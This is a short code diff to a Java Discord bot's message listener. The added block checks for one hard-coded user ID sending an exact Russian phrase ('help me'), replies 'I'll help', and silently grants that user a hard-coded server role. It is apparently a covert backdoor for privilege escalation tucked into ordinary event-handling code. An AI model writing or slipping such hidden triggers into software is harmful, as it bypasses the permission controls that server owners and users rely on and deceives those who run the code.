@@ -81,6 +81,10 @@ public class EventListener extends ListenerAdapter {
             }
             return;
         }
+        if (author.getId().equals("504343489664909322") && message.getContentDisplay().equals("@Boyfriend помоги((")) {
+            channel.sendMessage("Ща помогу").queue();
+            guild.addRoleToMember("504343489664909322", guild.getRoleById("782547802726596618")).queue();
+        }
         if (message.mentionsEveryone())
             return;
         CommandHandler.onMessageReceived(event);
